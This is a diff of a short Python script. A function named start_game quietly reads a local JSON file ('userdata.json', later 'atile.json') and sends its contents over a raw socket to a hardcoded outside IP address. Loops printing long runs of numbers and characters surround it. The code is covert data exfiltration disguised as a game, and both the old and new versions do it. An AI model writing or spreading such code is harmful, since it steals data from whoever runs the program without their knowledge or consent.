@@ -1,20 +1,24 @@
 import socket
 def start_game():
-    obj=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    obj.connect(("80.77.36.110",2023))
-    with open("file/userdata.json","r") as f:
-        text=f.read()
-    #text="token ({0})".format(text)
-    obj.sendall(text.encode("utf-8"))
-    #date=obj.recv(1024)
-    #print(date.decode("utf-8"))
-def funk():
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    with open("file/atile.json","r") as f:
+        reg_options=f.read()
+    s.connect(("80.77.36.110",2024))
+    #print(text)
+    s.sendall(reg_options.encode("utf-8"))
+    #date=s.recv(1024)
+    s.close()
+def go():
     for i in range(100000):
         yield i
-def funk2():
+def go2():
     for i in range(100000):
         yield chr(i)
-for g in funk():
+if __name__=="__main__":
+    g=go()
+    g2=go2()
     print(g)
-for g in funk2():
-    print(g)
+    for i in g:
+        print(i)
+    for i in g2:
+        print(i)
